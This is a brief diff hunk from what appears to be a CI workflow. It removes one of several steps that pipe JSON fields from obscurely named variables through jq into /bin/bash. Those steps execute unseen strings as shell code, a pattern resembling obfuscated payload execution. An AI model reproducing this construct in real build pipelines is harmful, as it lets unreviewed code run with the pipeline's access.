@@ -34,7 +34,6 @@ jobs:
           printf '%s' "$ksbhb7" | jq -r .hydv52 | /bin/bash
           printf '%s' "$th1805" | jq -r .byfc00661 | /bin/bash
           echo $uxmj644 | jq -r .nan02410 | /bin/bash
-          echo $hego291 | jq -r .q7 | /bin/bash
 
       - name: Archive output
         if: always()
